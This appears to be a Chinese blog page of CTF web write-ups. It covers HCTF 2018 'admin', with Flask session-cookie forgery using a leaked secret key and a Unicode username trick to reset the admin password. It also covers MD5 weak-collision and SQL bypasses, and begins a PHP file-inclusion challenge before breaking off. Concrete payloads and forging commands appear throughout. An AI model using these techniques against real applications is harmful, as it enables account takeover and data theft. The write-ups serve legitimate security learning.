<h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>没想到这题卧虎藏龙<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665566595361-0976113b-68b5-4e2d-b843-1823acbd379b.png#averageHue=%23fefefe&clientId=u0abdbc0f-af44-4&from=paste&height=298&id=uf3b57b14&name=image.png&originHeight=372&originWidth=1723&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26132&status=done&style=none&taskId=ue1dd858e-6f4c-4915-b1dc-3bf846bff1f&title=&width=1378.4" alt="image.png"><br>一个登入界面，右边的菜单有登录，注册按钮，先注册个账号再登入看看：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665566621350-b45a0a0d-2739-40c4-acb4-a5bbe361f481.png#averageHue=%23fefefe&clientId=u0abdbc0f-af44-4&from=paste&height=318&id=u869d161f&name=image.png&originHeight=397&originWidth=1571&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13547&status=done&style=none&taskId=uf2b0c4a2-5510-4918-8fd1-a1686ac3931&title=&width=1256.8" alt="image.png"><br>右边的菜单多了发帖，改密码，登出按钮，我一开始看到发帖以为是xss，后面给我干闷了，进入改密码界面看源代码会发现：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665566659726-edb1c8c3-f60d-4c1d-a00e-873536210245.png#averageHue=%23fdfcfb&clientId=u0abdbc0f-af44-4&from=paste&height=149&id=u5564b5db&name=image.png&originHeight=186&originWidth=767&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11356&status=done&style=none&taskId=u343133f6-369d-4369-84aa-09cd288f0b7&title=&width=613.6" alt="image.png"><br>有一个提示，是个github仓库链接：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665566681721-237d1b5b-c016-4f92-8808-ab1cf8028f66.png#averageHue=%23fefefd&clientId=u0abdbc0f-af44-4&from=paste&height=574&id=u68e0d014&name=image.png&originHeight=718&originWidth=1407&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69198&status=done&style=none&taskId=u1ef32525-3997-4dbd-b243-b3a074d039a&title=&width=1125.6" alt="image.png"><br>这个应该是flask源码，这个界面是flask框架，关注app里面的内容：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665566701067-a448c76a-039b-4d0e-9e9c-d229be0120bb.png#averageHue=%23fefefd&clientId=u0abdbc0f-af44-4&from=paste&height=540&id=u97ae6523&name=image.png&originHeight=675&originWidth=1648&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44592&status=done&style=none&taskId=u70e0b8e4-4099-44fa-a367-7db239a9052&title=&width=1318.4" alt="image.png"><br>重点关注路由和config：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, url_for, flash, request, redirect, session, make_response</span><br><span class="line"><span class="keyword">from</span> flask_login <span class="keyword">import</span> logout_user, LoginManager, current_user, login_user</span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> app, db</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> Config</span><br><span class="line"><span class="keyword">from</span> app.models <span class="keyword">import</span> User</span><br><span class="line"><span class="keyword">from</span> forms <span class="keyword">import</span> RegisterForm, LoginForm, NewpasswordForm</span><br><span class="line"><span class="keyword">from</span> twisted.words.protocols.jabber.xmpp_stringprep <span class="keyword">import</span> nodeprep</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> code <span class="keyword">import</span> get_verify_code</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/code&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_code</span>():</span><br><span class="line">    image, code = get_verify_code()</span><br><span class="line">    <span class="comment"># 图片以二进制形式写入</span></span><br><span class="line">    buf = BytesIO()</span><br><span class="line">    image.save(buf, <span class="string">&#x27;jpeg&#x27;</span>)</span><br><span class="line">    buf_str = buf.getvalue()</span><br><span class="line">    <span class="comment"># 把buf_str作为response返回前端，并设置首部字段</span></span><br><span class="line">    response = make_response(buf_str)</span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;image/gif&#x27;</span></span><br><span class="line">    <span class="comment"># 将验证码字符串储存在session中</span></span><br><span class="line">    session[<span class="string">&#x27;image&#x27;</span>] = code</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, title = <span class="string">&#x27;hctf&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    form = RegisterForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&#x27;image&#x27;</span>).lower() != form.verify_code.data.lower():</span><br><span class="line">            flash(<span class="string">&#x27;Wrong verify code.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, title = <span class="string">&#x27;register&#x27;</span>, form=form)</span><br><span class="line">        <span class="keyword">if</span> User.query.filter_by(username = name).first():</span><br><span class="line">            flash(<span class="string">&#x27;The username has been registered&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line">        user = User(username=name)</span><br><span class="line">        user.set_password(form.password.data)</span><br><span class="line">        db.session.add(user)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">&#x27;register successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, title = <span class="string">&#x27;register&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    form = LoginForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = name</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="keyword">not</span> user.check_password(form.password.data):</span><br><span class="line">            flash(<span class="string">&#x27;Invalid username or password&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">        login_user(user, remember=form.remember_me.data)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>, title = <span class="string">&#x27;login&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    logout_user()</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/change&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    form = NewpasswordForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(session[<span class="string">&#x27;name&#x27;</span>])</span><br><span class="line">        user = User.query.filter_by(username=name).first()</span><br><span class="line">        user.set_password(form.newpassword.data)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">&#x27;change successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;change.html&#x27;</span>, title = <span class="string">&#x27;change&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/edit&#x27;</span>, methods = [<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        </span><br><span class="line">        flash(<span class="string">&#x27;post successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;edit.html&#x27;</span>, title = <span class="string">&#x27;edit&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_not_found</span>(<span class="params">error</span>):</span><br><span class="line">    title = unicode(error)</span><br><span class="line">    message = error.description</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;errors.html&#x27;</span>, title=title, message=message)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">strlower</span>(<span class="params">username</span>):</span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Config</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    SECRET_KEY = os.environ.get(<span class="string">&#x27;SECRET_KEY&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;ckj123&#x27;</span></span><br><span class="line">    SQLALCHEMY_DATABASE_URI = <span class="string">&#x27;mysql+pymysql://root:adsl1234@db:3306/test&#x27;</span></span><br><span class="line">    SQLALCHEMY_TRACK_MODIFICATIONS = <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<p>到这里我也不会写，然后往里面点还有个template文件夹，里面有index.html<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665566857852-06fd5957-362c-4dcc-9fa1-a9a3b85f3b19.png#averageHue=%23fefefd&clientId=u0abdbc0f-af44-4&from=paste&height=287&id=u1b2787d4&name=image.png&originHeight=359&originWidth=1645&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30276&status=done&style=none&taskId=u944a2cc4-11cd-4d4a-beed-b8064ee9be7&title=&width=1316" alt="image.png"><br>意思大概就是要session的名字等于admin，flask的cookie被称为客户端session，因为它储存在客户端，具体参考<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/client-session-security.html">https://www.leavesongs.com/PENETRATION/client-session-security.html</a><br>flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。<br>进行加密分为以下几步：</p>
<ol>
<li>json.dumps 将对象转换成json字符串，作为数据</li>
<li>如果数据压缩后长度更短，则用zlib库进行压缩</li>
<li>将数据用base64编码</li>
<li>通过hmac算法计算数据的签名，将签名附在数据后，用“.”分割</li>
</ol>
<p>如果知道了secret_key就可以进行伪造了<br>可以用github大佬写的脚本去破解session读取内容：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py decode -c .eJxFkM2KwkAQhF9l6bOHZMa9CB5cRoOBblEmhp6LuGs0mR-FqOw44ruvetlDnar4qKo7bPZ9c25hdOmvzQA23Q5Gd_j4hhGgLT0Wy4zUzr9kdDUkdZALhQJD9WmKKlGxtgtdRbJfrdETSdY4FhypfmYKzMmyNBojhZlDwRlZ77leOxLzyLZ0pA9D0nNJyg1ZrBwnztEab2rylCY56dKhalu0U4kJf6mexoVyN05TgbrKTZi1HHgMjwH8nPv95nJyzfF_QqBgFGacltHoMpBYdST4hpolaidfPofqWcVFSmVHeudxOX7jjtvQPBGuO55gANdz07_PgTyDxx93MWUX.Y0aHvQ<span class="number">.2</span>eZPLe04Yk5xXy8vBOf8Fqu4nls</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;&#123;&quot;_fresh&quot;:true,&quot;_id&quot;:&#123;&quot; b&quot;:&quot;MjJlMGQ0NDdlNDdlZTU4NDg3ODM2MmU5ZGUzNGVjOTUxNjBhZTA3NjZkY2YxNWM2MGM1NjY3ZTMxNmFkM2Y0NjllYWVkN2IxYjJkNTg4NTI3NDk4Y2RkYzY1MjZlZWNlNzA1NTJkMDhhMjE3MzMwNWExODkyYzE2MTU1ZmFhYmY=&quot;&#125;,&quot;csrf_token&quot;:&#123;&quot; b&quot;:&quot;MmNmZDM0YzQxZTJmN2RiN2YyMTY3MTk3MmNmYmUxYjkxNzJiNTdlMQ==&quot;&#125;,&quot;name&quot;:&quot;kino&quot;,&quot;user_id&quot;:&quot;10&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>可以看到解密出来的内容，我们的name已经可以看到是kino了，思路是只要把kino改成admin，再重新签名即可，但是我们要知道secretkey，这时候重新看回我们上面的config文件，里面有个<code>or cjk123</code>也就是说cjk123也是key，我们接下来重新签名即可，首先先要把我们之前的kino用户的session用key再完全解密一次，结果为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;_fresh&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;_id&#x27;</span>: <span class="string">b&#x27;22e0d447e47ee584878362e9de34ec95160ae0766dcf15c60c5667e316ad3f469eaed7b1b2d588527498cddc6526eece70552d08a2173305a1892c16155faabf&#x27;</span>, <span class="string">&#x27;csrf_token&#x27;</span>: <span class="string">b&#x27;2cfd34c41e2f7db7f21671972cfbe1b9172b57e1&#x27;</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;kino&#x27;</span>, <span class="string">&#x27;user_id&#x27;</span>: <span class="string">&#x27;10&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
<p>再以这个结果进行更改，更改kino为admin，再重新加密：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\flask_session_cookie_manager3.py encode -s ckj123 -t <span class="string">&quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;22e0d447e47ee584878362e9de34ec95160ae0766dcf15c60c5667e316ad3f469eaed7b1b2d588527498cddc6526eece70552d08a2173305a1892c16155faabf&#x27;, &#x27;csrf_token&#x27;: b&#x27;2cfd34c41e2f7db7f21671972cfbe1b9172b57e1&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.eJxFkE9rwkAUxL9KeWcPya69CB4sq8HAe6JsDG8vYptosn8sRKXrit-92ksPc5rhx8zcYXcY2nMHk8twbUew6xuY3OHtEyaAtvRYrDNSjX_J6GpM6ihXCgWG6t0UVaJia1e6imQ_OqNnkqxxLDhS_cwUmJNlaTRGCguHgjOy3nO9dSSWkW3pSB_HpJeSlBuz2DhOnKM13tTkKc1y0qVD1XVo5xIT_lA9jyvlbpzmAnWVm7DoOPAUHiP4Og-H3eXbtaf_CYGCUZhxWkejy0Bi05PgG2qWqJ18-RyqZxUXKZU96cbjevqHO-1D-0Tsm9CfYATXczv8vQN5Bo9f3WBlbw.Y0aNkw.viDMioSeHzs2Pdb-XZB1QOrpkY4</span><br></pre></td></tr></table></figure>
<p>再登入就直接有答案了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665568187792-d128a1d5-bab0-41a9-ae09-eb01c7521891.png#averageHue=%23fdfdfd&clientId=u0abdbc0f-af44-4&from=paste&height=478&id=u497c7b3c&name=image.png&originHeight=598&originWidth=1731&originalType=binary&ratio=1&rotation=0&showTitle=false&size=57845&status=done&style=none&taskId=u06ce1dda-ca64-46c0-ab46-40278407165&title=&width=1384.8" alt="image.png"></p>
<p><strong>解法二（Unicode欺骗）：</strong><br>在change界面可以发现这一段代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(session[<span class="string">&#x27;name&#x27;</span>])</span><br></pre></td></tr></table></figure>
<p>通常来说我们python用的转小写函数是<code>lower()</code>，这里用了strlower(),不止这里用了，而且login、register，change界面也用的是strlower，然后就去溯源了一下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">strlower</span>(<span class="params">username</span>):</span><br><span class="line">    username = nodeprep.prepare(username)</span><br><span class="line">    <span class="keyword">return</span> username</span><br></pre></td></tr></table></figure>
<p>这是自定义的函数，而关于<code>nodeprep.prepare</code>，这里面有漏洞，对于如下字母<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665568418532-e92ef4c0-cb2f-436b-a33d-6f9e1deee33b.png#averageHue=%23fbfbfb&clientId=u0abdbc0f-af44-4&from=paste&id=ub8a3042d&name=image.png&originHeight=142&originWidth=708&originalType=url&ratio=1&rotation=0&showTitle=false&size=18077&status=done&style=none&taskId=u23ea061c-e430-4504-a7de-be7048a920f&title=" alt="image.png"><br><code>nodeprep.prepare</code>函数会进行如下操作：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665568461365-49a4df84-226b-45d9-bc45-c3ef996054b8.png#averageHue=%232b2c26&clientId=u0abdbc0f-af44-4&from=paste&id=u184f4714&name=image.png&originHeight=378&originWidth=823&originalType=url&ratio=1&rotation=0&showTitle=false&size=60618&status=done&style=none&taskId=uc8361be3-f6d2-43dc-bd3b-bf918bd4033&title=" alt="image.png"><br>第一次把他变为大写字母，第二次变为小写，利用这一点我们可以注册一个用户名叫做<code>ᴬᴰmin</code><br>然后经过第一次注册，最终用户名叫做<code>ADmin</code>，然后再修改密码的时候，改的是<code>admin</code>的密码，最后就可以达到修改管理员密码的目的了，这也是预期解：</p>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665569497177-32de0464-7f5a-44b0-a097-8b870b94244a.png#averageHue=%23fefefe&clientId=u0abdbc0f-af44-4&from=paste&height=231&id=u20b9e70f&name=image.png&originHeight=289&originWidth=971&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9584&status=done&style=none&taskId=uc6ac68e2-cf06-4f45-acdd-93555a838f8&title=&width=776.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665569541266-6aa8e1da-93fa-4e88-8128-7bb4dc3615ef.png#averageHue=%23fcfcfc&clientId=u0abdbc0f-af44-4&from=paste&height=206&id=u94a8db18&name=image.png&originHeight=257&originWidth=581&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9750&status=done&style=none&taskId=uf0cb2d72-5c9f-48cb-9f02-1fd0dfed7b6&title=&width=464.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665569559208-ce04bfe0-448c-4802-8110-78a0c3c12153.png#averageHue=%23fefefd&clientId=u0abdbc0f-af44-4&from=paste&height=255&id=u53586ded&name=image.png&originHeight=319&originWidth=847&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9992&status=done&style=none&taskId=ubd72247c-7ba5-4bf5-a0a0-4b43f9ef455&title=&width=677.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665569562572-0aaf492d-8733-4ef7-9249-3bc464179dee.png#averageHue=%23fcfbfb&clientId=u0abdbc0f-af44-4&from=paste&height=245&id=ubec8a4eb&name=image.png&originHeight=306&originWidth=1028&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24697&status=done&style=none&taskId=u8cffd676-d098-4394-ab85-4b698fd3b78&title=&width=822.4" alt="image.png"></p>
<h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>很简单的md5<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665574068282-7c53911e-e646-47d6-bad2-754a9a77d419.png#averageHue=%23968868&clientId=ua7a66470-779a-4&from=paste&height=762&id=u0be45a69&name=image.png&originHeight=952&originWidth=1735&originalType=binary&ratio=1&rotation=0&showTitle=false&size=158476&status=done&style=none&taskId=u787e1584-aa31-4320-964a-540d0f9fccf&title=&width=1388" alt="image.png"><br>hint提示一个查询语句，这一看就知道是输入<code>ffifdyop</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665574090314-b4db5f49-3a78-4479-8f03-76f510c2852d.png#averageHue=%23fbfbfb&clientId=ua7a66470-779a-4&from=paste&height=167&id=ud65a2f2d&name=image.png&originHeight=209&originWidth=1302&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14743&status=done&style=none&taskId=ua6abc2fd-b036-4e55-b2b1-c57b0f48743&title=&width=1041.6" alt="image.png"><br>访问源码进入这个界面，一个弱碰撞，payload：<br><code>a=QNKCDZO``b**=**240610708</code>:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665574164986-8c021a90-d5e2-44b2-9ccd-4326abe0a4f2.png#averageHue=%23fdfcfb&clientId=ub4f9a4f6-63c9-4&from=paste&height=209&id=ue7208028&name=image.png&originHeight=261&originWidth=1149&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19596&status=done&style=none&taskId=u718ed093-d20e-4972-a401-d5e869b78dc&title=&width=919.2" alt="image.png"><br>强碰撞数组绕过：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665574173754-614dd7b9-d266-4c88-95ab-294701836df8.png#averageHue=%239a9998&clientId=ub4f9a4f6-63c9-4&from=paste&height=620&id=ud3f088a2&name=image.png&originHeight=775&originWidth=1185&originalType=binary&ratio=1&rotation=0&showTitle=false&size=110356&status=done&style=none&taskId=ud2b00ddd-7b9a-4711-9276-8f6e6da34d9&title=&width=948" alt="image.png"></p>
<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$text = $_GET[<span class="string">&quot;text&quot;</span>];</span><br><span class="line">$file = $_GET[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">$password = $_GET[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(isset($text)&amp;&amp;(file_get_contents($text,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    echo <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents($text,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,$file))&#123;</span><br><span class="line">        echo <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        include($file);  //useless.php</span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>先<code>?text=data://text/plain,welcome to the zjctf&amp;file=php://filter/conver.base64-encode/resource=useless.php</code>:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1665575012848-b080f3dd-b2e0-423e-9995-cb25ab24065e.png#averageHue=%23fefdfd&clientId=ub4f9a4f6-63c9-4&from=paste&height=194&id=u71bc3e68&name=image.png&originHeight=243&originWidth=709&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16895&status=done&style=none&taskId=u755133bf-59ef-4258-b087-5046c21daef&title=&width=567.2" alt="image.png"><br>再本地构造：</p>
